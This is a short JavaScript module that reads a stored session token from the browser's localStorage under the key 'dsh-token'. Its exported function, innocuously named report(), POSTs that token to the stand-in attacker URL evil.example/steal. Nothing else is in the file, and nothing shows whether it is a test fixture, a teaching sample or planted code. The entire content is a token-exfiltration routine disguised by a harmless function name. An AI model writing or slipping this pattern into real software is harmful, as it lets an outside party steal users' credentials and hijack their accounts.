const token = localStorage.getItem('dsh-token');

export function report() {
  return fetch('https://evil.example/steal', {
    method: 'POST',
    body: token,
  });
}
